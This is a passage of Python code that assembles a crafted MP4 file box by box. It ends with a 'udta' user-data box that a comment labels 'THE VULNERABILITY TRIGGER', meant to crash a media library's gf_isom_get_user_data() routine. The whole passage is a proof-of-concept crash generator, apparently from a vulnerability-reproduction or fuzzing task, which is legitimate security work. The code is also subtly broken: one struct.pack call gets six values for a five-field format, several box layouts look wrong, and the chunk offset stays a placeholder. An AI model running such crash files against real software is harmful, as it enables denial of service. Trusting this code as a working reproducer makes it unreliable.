in_movie | track_in_preview\ntkhd_data = struct.pack(\'>IIIIHH\', \n    0,      # creation_time\n    0,      # modification_time\n    1,      # track_ID\n    0,      # reserved\n    1000,   # duration\n    0       # reserved\n)\ntkhd_data += struct.pack(\'>hh\', 0, 0)  # layer, alternate_group\ntkhd_data += struct.pack(\'>HH\', 0, 0)  # volume, reserved\n# Unity matrix\ntkhd_data += struct.pack(\'>9I\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\ntkhd_data += struct.pack(\'>II\', 320 << 16, 240 << 16)  # width, height\ntrak_parts.append(write_fullbox(\'tkhd\', 0, tkhd_flags, tkhd_data))\n\n# 2.2.2 mdia box (media)\nmdia_parts = []\n\n# mdhd box (media header) - version 0\nmdhd_data = struct.pack(\'>IIIIHH\', \n    0,      # creation_time\n    0,      # modification_time\n    1000,   # timescale\n    1000,   # duration\n    0x55c4, # language (\'und\')\n    0       # pre_defined\n)\nmdia_parts.append(write_fullbox(\'mdhd\', 0, 0, mdhd_data))\n\n# hdlr box (handler)\nhdlr_data = struct.pack(\'>I\', 0) + b\'\\x00\\x00\\x00\\x00\'  # pre_defined\nhdlr_data += b\'vide\' + b\'\\x00\' * 12  # handler_type, reserved\nhdlr_data += b\'VideoHandler\\x00\'\nmdia_parts.append(write_fullbox(\'hdlr\', 0, 0, hdlr_data))\n\n# minf box (media information)\nminf_parts = []\n\n# vmhd box (video media header)\nvmhd_data = struct.pack(\'>HHHH\', 0, 0, 0, 0)  # graphicsmode, opcolor[3]\nminf_parts.append(write_fullbox(\'vmhd\', 0, 1, vmhd_data))\n\n# dinf box (data information)\nurl_data = b\'\'  # flags=1 means self-contained\ndref_entry = write_fullbox(\'url \', 0, 1, url_data)\ndref_data = struct.pack(\'>I\', 1) + dref_entry  # entry_count=1\ndinf_data = write_fullbox(\'dref\', 0, 0, dref_data)\nminf_parts.append(write_box(\'dinf\', dinf_data))\n\n# stbl box (sample table)\nstbl_parts = []\n\n# stsd box (sample description) - simplified with mp4v\nmp4v_data = b\'\\x00\' * 6 + struct.pack(\'>H\', 1)  # reserved[6], data_reference_index\nmp4v_data += b\'\\x00\\x00\'  # pre_defined\nmp4v_data += b\'\\x00\\x00\'  # reserved\nmp4v_data += b\'\\x00\' * 12  # pre_defined[3]\nmp4v_data += struct.pack(\'>HH\', 320, 240)  # width, height\nmp4v_data += struct.pack(\'>II\', 0x00480000, 0x00480000)  # horizresolution, vertresolution\nmp4v_data += struct.pack(\'>I\', 0)  # reserved\nmp4v_data += struct.pack(\'>H\', 1)  # frame_count\nmp4v_data += b\'\\x00\' * 32  # compressorname[32]\nmp4v_data += struct.pack(\'>HH\', 0x0018, 0xffff)  # depth, pre_defined\n\n# esds box (elementary stream descriptor) - minimal\nesds_data = struct.pack(\'>BBBB\', 0x03, 0x19, 0x00, 0x00)  # ES_DescrTag\nesds_data += struct.pack(\'>BBBBBBB\', 0x04, 0x11, 0x40, 0x15, 0x00, 0x00, 0x00)  # DecoderConfigDescrTag\nesds_data += struct.pack(\'>IIBBB\', 0x00000000, 0x00000000, 0x05, 0x02, 0x00, 0x00)  # DecSpecificInfoTag\nmp4v_data += write_fullbox(\'esds\', 0, 0, esds_data)\n\nmp4v_box = write_box(\'mp4v\', mp4v_data)\nstsd_data = struct.pack(\'>I\', 1) + mp4v_box  # entry_count=1\nstbl_parts.append(write_fullbox(\'stsd\', 0, 0, stsd_data))\n\n# stts box (time-to-sample)\nstts_data = struct.pack(\'>I\', 1) + struct.pack(\'>II\', 1, 1000)\nstbl_parts.append(write_fullbox(\'stts\', 0, 0, stts_data))\n\n# stsc box (sample-to-chunk)\nstsc_data = struct.pack(\'>I\', 1) + struct.pack(\'>III\', 1, 1, 1)\nstbl_parts.append(write_fullbox(\'stsc\', 0, 0, stsc_data))\n\n# stsz box (sample size)\nstsz_data = struct.pack(\'>II\', 0, 1) + struct.pack(\'>I\', 100)\nstbl_parts.append(write_fullbox(\'stsz\', 0, 0, stsz_data))\n\n# stco box (chunk offset) - calculate proper offset\n# We need to calculate where mdat will be\nftyp_size = 8 + len(ftyp_data)\n# moov size will be calculated after building all parts\nstco_placeholder_offset = 1000  # Will be updated after calculating moov size\nstco_data = struct.pack(\'>I\', 1) + struct.pack(\'>I\', stco_placeholder_offset)\nstbl_parts.append(write_fullbox(\'stco\', 0, 0, stco_data))\n\nminf_parts.append(write_box(\'stbl\', b\'\'.join(stbl_parts)))\nmdia_parts.append(write_box(\'minf\', b\'\'.join(minf_parts)))\ntrak_parts.append(write_box(\'mdia\', b\'\'.join(mdia_parts)))\n\n# 2.2.3 udta box (user data) - THE VULNERABILITY TRIGGER!\n# Add a UUID box to trigger the crash when gf_isom_get_user_data() is called with UUID=NULL\nudta_parts = []\nuuid_value = b\'\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde\\xf0\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde\\xf0\'  # 16-byte UUID\nuuid_payload = b\'trigger_crash\'\nuuid_box = struct.pack(\'>I4s\', 8 + 16 + len(uuid_payload), b\'uuid\') + uuid_value + uuid_payload\nudta_parts.append(uuid_box)\n\ntrak_parts.append(write_box(\'udta\', b\'\'.join(udta_parts)))\n\nmoov_parts.append(write_box(\'trak\', b\'\'.join(trak_parts)))\nmoov_box = write_box(\'moov\', b\'\'.join(moov_parts))\nboxes.append(moov_box)\n\n# 3. mdat box with sample data\nmdat_data = b\'\\x00\' * 100\nboxes.append(write_box(\'mdat\', mdat_data))\n\n# Write all boxes\nwith open(output_path, \'wb\') as f:\n    for box in boxes:\n        f.write(box)\n\nprint(f"Generated testcase at {output_path}")\nprint(f"Total file size: {sum(len(b) for b in boxes)} bytes")\n'}
